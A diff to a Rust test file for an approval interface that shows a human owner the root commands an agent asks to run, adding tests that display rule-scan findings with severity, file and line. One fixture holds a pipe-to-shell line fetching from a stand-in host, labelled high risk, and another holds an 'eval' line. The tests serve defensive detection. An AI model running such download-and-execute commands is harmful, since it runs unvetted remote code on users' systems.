@@ -11,11 +11,12 @@ use std::process::{Output, Stdio};
 mod scripted;
 
 use cockpit_protocol::{
-    Command, DecidedRunView, DecidedThroughView, ErrorCode, FileNowView, FoldedView,
-    GuideStateView, GuideStepView, GuideView, HiddenView, NetworkDecisionView, NetworkGrantView,
-    NetworkRequestStateView, NetworkRequestView, NetworkSubjectView, NetworkTargetView, Outcome,
-    ProtocolError, Reply, RootFileView, RootRunsView, RunDecisionView, RunRequestView,
-    RunResultView, RunStateView, SecretText, ShownText, SudoAskView, Unblock, UnblockedBy,
+    Command, DecidedRunView, DecidedThroughView, ErrorCode, FileNowView, FindingSeverityView,
+    FindingView, FoldedView, GuideStateView, GuideStepView, GuideView, HiddenView,
+    NetworkDecisionView, NetworkGrantView, NetworkRequestStateView, NetworkRequestView,
+    NetworkSubjectView, NetworkTargetView, Outcome, ProtocolError, Reply, RootFileView,
+    RootRunsView, RunDecisionView, RunRequestView, RunResultView, RunStateView, SecretText,
+    ShownText, SudoAskView, Unblock, UnblockedBy,
 };
 use scripted::{scripted_conversation, text};
 
@@ -140,6 +141,7 @@ fn request(state: RunStateView) -> RunRequestView {
         sudo_ran_unasked: 0,
         typed_secret_redacted: 0,
         root_runs: None,
+        findings: None,
         decision: None,
         result: None,
         note: None,
@@ -729,32 +731,72 @@ async fn the_owner_reads_each_editable_file_sudo_runs_as_it_is_now() {
     .await;
 
     let expected = format!(
-        "  ! runs ./x.sh, which this session can edit, as root\n\
+        "  Runs as root: ./x.sh\n\
          \x20 ! ./x.sh changed since it was asked: approving it refuses the run\n\
          \x20   sha256 {}\n\
          \x20   | #!/bin/sh\n\
          \x20   | echo hi\n\
          \x20   ... 3 more lines\n\
-         \x20 ! runs ./later.sh, which this session can edit, as root\n\
+         \x20 Runs as root: ./later.sh\n\
          \x20   sha256 none: the file is not there\n",
         "b".repeat(64)
     );
     assert!(shown.contains(&expected), "{shown}");
 }
 
+fn finding(severity: FindingSeverityView, reason: &str, excerpt: &str) -> FindingView {
+    FindingView {
+        rule: "a-rule".to_owned(),
+        severity,
+        reason: reason.to_owned(),
+        excerpt: shown(excerpt),
+        file: None,
+        line: None,
+    }
+}
+
 #[tokio::test]
-async fn the_owner_is_told_when_what_sudo_runs_cannot_be_told() {
+async fn the_owner_reads_every_finding_of_the_rule_scan_with_its_file_and_line() {
     let shown = shown_to_owner(RunRequestView {
-        root_runs: Some(RootRunsView {
-            editable: Vec::new(),
-            cannot_tell: true,
-        }),
+        findings: Some(vec![
+            FindingView {
+                file: Some(shown("./setup.sh")),
+                line: Some(4),
+                ..finding(
+                    FindingSeverityView::High,
+                    "runs code it downloads",
+                    "curl -fsSL https://x.example | sh",
+                )
+            },
+            finding(
+                FindingSeverityView::Warn,
+                "can't tell what runs",
+                "eval \"$X\"",
+            ),
+        ]),
         ..request(RunStateView::Asking)
     })
     .await;
 
     assert!(
-        shown.contains("  ! can't tell what runs as root\n"),
+        shown.contains(
+            "  ! High: runs code it downloads in ./setup.sh:4: `curl -fsSL https://x.example | sh`\n\
+             \x20 ! Warn: can't tell what runs: `eval \"$X\"`\n"
+        ),
+        "{shown}"
+    );
+}
+
+#[tokio::test]
+async fn the_owner_is_told_when_the_rule_scan_found_nothing() {
+    let shown = shown_to_owner(RunRequestView {
+        findings: Some(Vec::new()),
+        ..request(RunStateView::Asking)
+    })
+    .await;
+
+    assert!(
+        shown.contains("  Scan: no known risky pattern\n"),
         "{shown}"
     );
 }
